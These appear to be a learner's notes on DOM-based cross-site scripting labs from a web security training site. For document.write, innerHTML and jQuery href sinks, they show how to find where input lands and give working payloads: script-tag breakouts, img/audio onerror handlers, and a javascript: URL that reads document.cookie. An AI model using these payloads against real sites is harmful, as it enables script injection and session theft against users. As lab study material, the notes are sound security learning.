## dom
### document.write
```
# view-source / inspect element
# see that my search string ends up in <img> tag:

<img src="/resources/images/tracker.gif?searchTerms=adsf" q7yoldkbi="">

# adjust search string to inject xss via <img> tag

sadf"><script>alert(1)</script>
```

### innerHTML
```
# view-source / inspect element
# see that my search string ends up in <span> tag:

<span id="searchMessage">fake</span>

# break out
# key: force an error to trigger "onerror"

<img src=1 onerror=alert(1)>
<audio src/onerror=alert(2)>

# other key notes: it's totally ok to inject javascript as-is into <span> tags
```

### jQuery href
```
# see that '/feedback?returnPath=/' returns HTTP response with "src" calling "jquery":

<script src="/resources/js/jquery_1-8-2.js"></script>
<div class="is-linkback">
	<a id="backLink">Back</a>
</div>
<script>
	$(function() {
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>

# see that a <href> tag is being built, using the input passed to "returnPath"
# try inject random chars to "returnPath":

/feedback?returnPath=asdf

# see that the resulting "Back" link leads to:

https://0af3007a032c23bcc10958b000a10065.web-security-academy.net/asdf

# now inject 

/feedback?returnPath=javascript:alert(document.cookie) 

# now the "Back" link simply reads:

javascript:alert(document.cookie)

# note: this uses the `javascript:` protocol to run text as JavaScript instead of opening it as a normal link
# sauce: https://riptutorial.com/html/example/2120/link-that-runs-javascript
```

